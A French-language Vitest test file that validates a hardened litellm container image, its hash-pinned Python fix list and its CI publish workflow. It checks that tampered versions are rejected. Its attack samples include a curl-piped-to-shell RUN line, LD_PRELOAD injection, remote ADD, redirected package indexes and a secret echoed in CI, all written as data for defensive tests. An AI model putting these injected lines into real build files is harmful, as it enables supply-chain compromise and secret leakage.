import { existsSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { load } from "js-yaml";
import { describe, expect, it } from "vitest";

// Image dérivée litellm (ADR 0015). Fichiers lus par de vrais analyseurs : Dockerfile instruction par instruction, YAML par js-yaml, correctifs ligne par ligne.

const chemin = (c: string) => fileURLToPath(new URL(`../${c}`, import.meta.url));
const lire = (c: string) => (existsSync(chemin(c)) ? readFileSync(chemin(c), "utf8") : "");
const DOSSIER = "ops/images/litellm-derivee";
const AMONT = "ghcr.io/berriai/litellm-non_root:main-v1.83.14-stable.patch.3@sha256:6da3c89855a0fd1c92258651e01b57f3d1ccb028afef0b4c62c9b89422dc2b77";
const TRIVY = "ghcr.io/aquasecurity/trivy@sha256:665030f4d33a82c1e8d9d5e0453365842236723c1ee5cc3becca698268e66a56";
const IMAGE = "ghcr.io/will383842/axion-automatisations-clients/litellm-derivee";
const CONDITION_PUBLIER = "github.event_name != 'pull_request' && github.ref == 'refs/heads/main'";

type Obj = Record<string, unknown>;
const estObj = (v: unknown): v is Obj => typeof v === "object" && v !== null && !Array.isArray(v);
const copie = <T>(v: T): T => JSON.parse(JSON.stringify(v)) as T;

interface Instruction {
  cmd: string;
  arg: string;
}
function instructions(texte: string): Instruction[] {
  const sortie: Instruction[] = [];
  let courante = "";
  for (const brute of texte.split("\n")) {
    const l = brute.trim();
    if (l.startsWith("#")) continue;
    if (l.endsWith("\\")) {
      courante += `${l.slice(0, -1)} `;
      continue;
    }
    const complete = `${courante}${l}`.trim();
    courante = "";
    if (!complete) continue;
    const [cmd = "", ...reste] = complete.split(/\s+/);
    sortie.push({ cmd: cmd.toUpperCase(), arg: reste.join(" ") });
  }
  return sortie;
}

const INSTALLATION = /^python -m pip install --no-cache-dir --no-deps --require-hashes -r \/tmp\/correctifs\.txt && python -m pip check && python -c "[^"]*" && rm \/tmp\/correctifs\.txt$/;
function analyserDockerfile(texte: string): string[] {
  const erreurs: string[] = [];
  const liste = instructions(texte);
  if (texte.split("\n").some((l) => /^\s*#\s*[A-Za-z]+\s*=/.test(l))) erreurs.push("directive d'analyse interdite");
  const from = liste.filter((i) => i.cmd === "FROM");
  if (from.length !== 1) erreurs.push("un seul FROM exigé");
  if (from[0]?.arg !== AMONT) erreurs.push("FROM différent de l'amont épinglé par empreinte");
  const runs = liste.filter((i) => i.cmd === "RUN");
  if (runs.length !== 1 || !INSTALLATION.test(runs[0]?.arg ?? "")) erreurs.push("un seul RUN : pip install --no-deps --require-hashes, pip check, version de litellm, nettoyage");
  if (/--(index-url|extra-index-url|find-links|trusted-host|no-verify|no-index)|-i\s|-f\s|\|\s*(ba)?sh|\b(curl|wget|apk|apt|apt-get)\b/.test(runs[0]?.arg ?? "")) erreurs.push("source de paquets ou téléchargement détournés");
  for (const i of liste) {
    if (["ADD", "ENTRYPOINT", "CMD", "VOLUME", "ONBUILD", "ENV", "SHELL", "HEALTHCHECK", "ARG"].includes(i.cmd)) erreurs.push(`${i.cmd} interdit`);
    if (i.cmd === "COPY" && i.arg !== "correctifs.txt /tmp/correctifs.txt") erreurs.push("COPY : correctifs.txt seulement");
  }
  const users = liste.filter((i) => i.cmd === "USER");
  if (users[0]?.arg !== "root" || users.length !== 2) erreurs.push("USER root pour l'installation, puis un utilisateur final");
  const dernier = liste.at(-1);
  if (dernier?.cmd !== "USER" || ["root", "0", "0:0", "root:root"].includes(dernier.arg) || dernier.arg.includes("$")) erreurs.push("la dernière instruction doit être USER non root");
  return erreurs;
}

const LIGNE = /^([A-Za-z0-9_.-]+)==(\d+(?:\.\d+)*)(?: --hash=sha256:([0-9a-f]{64}))+$/;
function analyserCorrectifs(texte: string): string[] {
  const erreurs: string[] = [];
  const lignes = texte.split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
  if (!lignes.length) erreurs.push("aucun correctif");
  const vus = new Set<string>();
  for (const l of lignes) {
    const m = LIGNE.exec(l);
    if (!m) erreurs.push(`ligne refusée : ${l.slice(0, 40)}`);
    else {
      const nom = (m[1] ?? "").toLowerCase().replace(/[-_.]+/g, "-");
      if (nom === "litellm" || nom.startsWith("litellm-")) erreurs.push("le produit lui-même ne se remplace pas");
      if (vus.has(nom)) erreurs.push(`doublon : ${nom}`);
      vus.add(nom);
    }
  }
  return erreurs;
}

const etapes = (job: unknown): Obj[] => (estObj(job) && Array.isArray(job.steps) ? job.steps.filter(estObj) : []);
const execute = (e: Obj) => (typeof e.run === "string" ? e.run : "");
const trouver = (job: unknown, motif: string) => etapes(job).findIndex((e) => execute(e).includes(motif));

function analyserWorkflow(doc: Obj): string[] {
  const erreurs: string[] = [];
  const jobs = estObj(doc.jobs) ? doc.jobs : {};
  const construire = jobs["construire-litellm"];
  const publier = jobs["publier-litellm"];
  if (!estObj(construire) || !estObj(publier)) return ["jobs construire-litellm et publier-litellm exigés"];
  if (JSON.stringify(construire.permissions) !== JSON.stringify({ contents: "read" })) erreurs.push("construire-litellm : contents: read seulement");
  if (JSON.stringify(Object.entries(estObj(publier.permissions) ? publier.permissions : {}).sort()) !== JSON.stringify([["attestations", "write"], ["contents", "read"], ["id-token", "write"], ["packages", "write"]])) erreurs.push("publier-litellm : permissions exactes");
  if (publier.if !== CONDITION_PUBLIER) erreurs.push("publier-litellm : ni sur pull_request ni hors main");
  if (publier.needs !== "construire-litellm") erreurs.push("publier-litellm : needs construire-litellm");
  if (Object.keys(construire).sort().join(",") !== "name,permissions,runs-on,steps") erreurs.push("construire-litellm : clés exactes");
  if (Object.keys(publier).sort().join(",") !== "if,name,needs,permissions,runs-on,steps") erreurs.push("publier-litellm : clés exactes");
  for (const [nom, job] of [["construire-litellm", construire], ["publier-litellm", publier]] as const) {
    for (const e of etapes(job)) {
      if ("if" in e || "continue-on-error" in e) erreurs.push(`${nom} : étape conditionnelle ou tolérée`);
      if (Object.keys(e).some((k) => !["name", "id", "uses", "with", "run", "env"].includes(k))) erreurs.push(`${nom} : clé d'étape inattendue`);
      if ("env" in e && !(nom === "publier-litellm" && e.id === "pousser" && JSON.stringify(e.env) === JSON.stringify({ GITHUB_TOKEN: "${{ github.token }}" }))) erreurs.push(`${nom} : env réservé au push`);
      if (typeof e.uses === "string" && !/^actions\/(checkout|setup-node|attest-build-provenance)@[0-9a-f]{40}$/.test(e.uses)) erreurs.push(`action non épinglée ou hors liste : ${e.uses}`);
      if (typeof e.uses === "string" && e.uses.startsWith("actions/checkout@") && !(estObj(e.with) && e.with["persist-credentials"] === false)) erreurs.push("checkout sans persist-credentials: false");
      if (typeof e.uses === "string" && e.uses.startsWith("actions/attest-build-provenance@") && nom !== "publier-litellm") erreurs.push("attestation hors publier-litellm");
      const cmd = execute(e);
      if (nom === "construire-litellm" && /docker\s+(push|login)|--push/.test(cmd)) erreurs.push("construire-litellm : publication interdite");
      if (cmd.includes("aquasecurity/trivy") && !cmd.includes(TRIVY)) erreurs.push("Trivy : autre empreinte");
      if (/secrets\./.test(cmd) || /ignore|skip-dirs|--severity|--ignore-unfixed/.test(cmd)) erreurs.push("secret ou option d'ignorance");
    }
    const [build, fumee, trivy, garde] = ["docker build --pull --platform linux/amd64", "fumee.sh", "aquasecurity/trivy", "releve-trivy.ts --garde"].map((m) => trouver(job, m));
    if ([build, fumee, trivy, garde].some((n) => (n ?? -1) < 0) || !((build ?? 0) < (fumee ?? 0) && (fumee ?? 0) < (trivy ?? 0) && (trivy ?? 0) < (garde ?? 0))) erreurs.push(`${nom} : construction, fumée, Trivy, évaluateur dans cet ordre`);
    if (!etapes(job).some((e) => execute(e).includes("ops/images/litellm-derivee"))) erreurs.push(`${nom} : doit construire ops/images/litellm-derivee`);
  }
  const [garde, pousser] = ["releve-trivy.ts --garde", "docker push"].map((m) => trouver(publier, m));
  const attester = etapes(publier).findIndex((e) => typeof e.uses === "string" && e.uses.startsWith("actions/attest-build-provenance@"));
  if ((pousser ?? -1) < 0 || attester < 0 || !((garde ?? 0) < (pousser ?? 0) && (pousser ?? 0) < attester)) erreurs.push("publier-litellm : push après l'évaluateur, attestation après le push");
  else {
    const push = etapes(publier)[pousser ?? 0] ?? {};
    const w = etapes(publier)[attester]?.with;
    if (typeof push.id !== "string" || !execute(push).includes("RepoDigests") || !execute(push).includes(`${IMAGE}`)) erreurs.push("push : image et empreinte lue après le push");
    else if (!estObj(w) || w["subject-name"] !== IMAGE || w["subject-digest"] !== `\${{ steps.${push.id}.outputs.empreinte }}` || w["push-to-registry"] !== true) erreurs.push("attestation : doit porter l'empreinte poussée");
  }
  if ((lire(".github/workflows/images-derivees.yml").match(/docker push/g) ?? []).length !== 2) erreurs.push("exactement deux docker push dans le fichier");
  return erreurs;
}

const reel = () => load(lire(".github/workflows/images-derivees.yml")) as Obj;
const jobs = (d: Obj) => d.jobs as Obj;
const job = (d: Obj, n: string) => jobs(d)[n] as Obj;
const pas = (d: Obj, n: string, m: string) => etapes(job(d, n))[trouver(job(d, n), m)] as Obj;

describe("image dérivée litellm : Dockerfile", () => {
  it("[A-381] image dérivée litellm : FROM égal à l'amont épinglé, même tag que la brique d'origine", () => {
    expect(instructions(lire(`${DOSSIER}/Dockerfile`)).filter((i) => i.cmd === "FROM").map((i) => i.arg)).toEqual([AMONT]);
    expect(AMONT).toContain("main-v1.83.14-stable.patch.3@sha256:");
  });
  it("[A-381] image dérivée litellm : pip install --no-deps --require-hashes puis pip check, et l'utilisateur final n'est pas root", () => {
    expect(analyserDockerfile(lire(`${DOSSIER}/Dockerfile`))).toEqual([]);
  });
  it("[A-381] image dérivée litellm : correctifs.txt, chaque ligne paquet==version avec --hash=sha256:, aucune ligne litellm", () => {
    expect(analyserCorrectifs(lire(`${DOSSIER}/correctifs.txt`))).toEqual([]);
  });
  it("[A-381] image dérivée litellm : fumee.sh vérifie l'utilisateur, pip check, la version et la santé", () => {
    const f = lire(`${DOSSIER}/fumee.sh`);
    for (const m of ["set -eu", "pip check", "1.83.14", "/health/liveliness", "Config.User"]) expect(f).toContain(m);
  });
  describe("attaques refusées", () => {
    const ok = lire(`${DOSSIER}/Dockerfile`);
    const attaques: [string, string][] = [
      ["FROM sur une étiquette seule", ok.replace(/^FROM .*$/m, "FROM ghcr.io/berriai/litellm-non_root:main-v1.83.14-stable.patch.3")],
      ["FROM sur latest", ok.replace(/^FROM .*$/m, "FROM ghcr.io/berriai/litellm-non_root:latest")],
      ["FROM d'une autre empreinte", ok.replace(/@sha256:[0-9a-f]{64}/, `@sha256:${"0".repeat(64)}`)],
      ["deuxième FROM", `${ok}\nFROM alpine:3.20`],
      ["sans --no-deps", ok.replace("--no-deps ", "")],
      ["sans --require-hashes", ok.replace("--require-hashes ", "")],
      ["sans pip check", ok.replace("python -m pip check && ", "")],
      ["index de paquets détourné", ok.replace("pip install", "pip install --extra-index-url https://exemple.test/simple")],
      ["téléchargement par curl", ok.replace("RUN ", "RUN curl -s https://exemple.test/x | sh && ")],
      ["démarrage en root", ok.replace(/USER nonroot\s*$/, "USER root\n")],
      ["utilisateur final par variable", ok.replace(/USER nonroot\s*$/, "USER $UTILISATEUR\n")],
      ["instruction après USER final", `${ok.trimEnd()}\nRUN true\n`],
      ["ENTRYPOINT remplacé", ok.replace("USER root", 'USER root\nENTRYPOINT ["sh"]')],
      ["LD_PRELOAD", ok.replace("USER root", "USER root\nENV LD_PRELOAD=/tmp/x.so")],
      ["ADD d'une URL", ok.replace("USER root", "USER root\nADD https://exemple.test/x /tmp/x")],
      ["COPY d'un autre fichier", ok.replace("COPY correctifs.txt /tmp/correctifs.txt", "COPY . /tmp/")],
      ["ARG nommé comme un secret", ok.replace("USER root", "USER root\nARG TOKEN_DEPOT")],
      ["directive syntax", `# syntax=docker.io/exemple/frontend:latest\n${ok}`],
    ];
    it.each(attaques)("[A-381] Dockerfile litellm refusé : %s", (_nom, texte) => {
      expect(texte).not.toBe(ok);
      expect(analyserDockerfile(texte)).not.toEqual([]);
    });
  });
  describe("correctifs refusés", () => {
    const h = "a".repeat(64);
    const attaques: [string, string][] = [
      ["sans empreinte", "setuptools==84.2.1"],
      ["version non figée", `setuptools>=84 --hash=sha256:${h}`],
      ["empreinte md5", "setuptools==84.2.1 --hash=md5:abcdef"],
      ["empreinte courte", "setuptools==84.2.1 --hash=sha256:abc"],
      ["empreinte en majuscules", `setuptools==84.2.1 --hash=sha256:${h.toUpperCase()}`],
      ["URL directe", "https://exemple.test/x.whl"],
      ["dépôt git", "git+https://exemple.test/x.git#egg=x"],
      ["index détourné", "--extra-index-url https://exemple.test/simple"],
      ["remplacement de litellm", `litellm==1.83.14 --hash=sha256:${h}`],
      ["remplacement par un nom normalisé", `LiteLLM==1.99.0 --hash=sha256:${h}`],
      ["doublon", `setuptools==84.2.1 --hash=sha256:${h}\nSetuptools==83.0.0 --hash=sha256:${h}`],
      ["fichier vide", "# rien"],
    ];
    it.each(attaques)("[A-381] correctifs refusés : %s", (_nom, texte) => {
      expect(analyserCorrectifs(texte)).not.toEqual([]);
    });
  });
});

describe("image dérivée litellm : workflow", () => {
  it("[A-381] images-derivees.yml : jobs litellm sans écriture sur pull_request, évaluateur et Trivy identiques à postgres, attestation sur l'empreinte poussée", () => {
    expect(analyserWorkflow(reel())).toEqual([]);
  });
  it("[A-381] images-derivees.yml : seuils et absence de .trivyignore inchangés", () => {
    expect(existsSync(chemin(".trivyignore"))).toBe(false);
    expect(lire("scripts/releve-trivy.ts")).toContain("CRITICAL: 7, HIGH: 30");
  });
  describe("attaques refusées", () => {
    const modif = (f: (d: Obj) => void) => {
      const d = copie(reel());
      f(d);
      return analyserWorkflow(d);
    };
    const attaques: [string, (d: Obj) => void][] = [
      ["publier-litellm sur pull_request", (d) => delete job(d, "publier-litellm").if],
      ["publier-litellm sur toute branche", (d) => (job(d, "publier-litellm").if = "github.event_name != 'pull_request'")],
      ["écriture de paquets dans construire-litellm", (d) => (job(d, "construire-litellm").permissions = { contents: "read", packages: "write" })],
      ["continue-on-error sur l'évaluateur", (d) => (pas(d, "publier-litellm", "releve-trivy.ts --garde")["continue-on-error"] = true)],
      ["if false sur la fumée", (d) => (pas(d, "construire-litellm", "fumee.sh").if = "false")],
      ["Trivy d'une autre empreinte", (d) => (pas(d, "construire-litellm", "aquasecurity/trivy").run = "docker run trivy:latest image x")],
      ["option d'ignorance dans Trivy", (d) => (pas(d, "construire-litellm", "aquasecurity/trivy").run = `${execute(pas(d, "construire-litellm", "aquasecurity/trivy"))} --ignore-unfixed`)],
      ["secret", (d) => (pas(d, "publier-litellm", "docker push").run = `${execute(pas(d, "publier-litellm", "docker push"))}\necho \${{ secrets.JETON }}`)],
      ["push dans construire-litellm", (d) => etapes(job(d, "construire-litellm")).push({ run: "docker push local/x" })],
      ["push avant l'évaluateur", (d) => { const s = etapes(job(d, "publier-litellm")); const p = s.splice(trouver(job(d, "publier-litellm"), "docker push"), 1)[0]!; s.splice(trouver(job(d, "publier-litellm"), "releve-trivy.ts --garde"), 0, p); }],
      ["attestation sur une autre empreinte", (d) => ((etapes(job(d, "publier-litellm")).at(-1)!.with as Obj)["subject-digest"] = "sha256:inventee")],
      ["attestation sur l'image postgres", (d) => ((etapes(job(d, "publier-litellm")).at(-1)!.with as Obj)["subject-name"] = "ghcr.io/will383842/axion-automatisations-clients/postgres-derivee")],
      ["action non épinglée", (d) => (etapes(job(d, "construire-litellm"))[0]!.uses = "actions/checkout@v4")],
      ["action docker tierce", (d) => etapes(job(d, "construire-litellm")).push({ uses: `docker/build-push-action@${"a".repeat(40)}` })],
      ["job publier-litellm sans needs", (d) => delete job(d, "publier-litellm").needs],
      ["env de job dans publier-litellm", (d) => (job(d, "publier-litellm").env = { NODE_ENV: "x" })],
    ];
    it.each(attaques)("[A-381] workflow litellm refusé : %s", (_nom, f) => {
      expect(modif(f)).not.toEqual([]);
    });
  });
});

describe("image dérivée litellm : documents", () => {
  it("[A-381] ADR 0015, ligne du README des ADR et Dependabot docker pour litellm-derivee", () => {
    expect(lire("docs/adr/0015-image-derivee-litellm.md")).toContain("Trivy");
    expect(lire("docs/adr/README.md")).toContain("| 0015 |");
    const dependabot = load(lire(".github/dependabot.yml")) as { updates: { "package-ecosystem": string; directory: string }[] };
    expect(dependabot.updates.filter((u) => u["package-ecosystem"] === "docker").map((u) => u.directory)).toContain("/ops/images/litellm-derivee");
  });
});
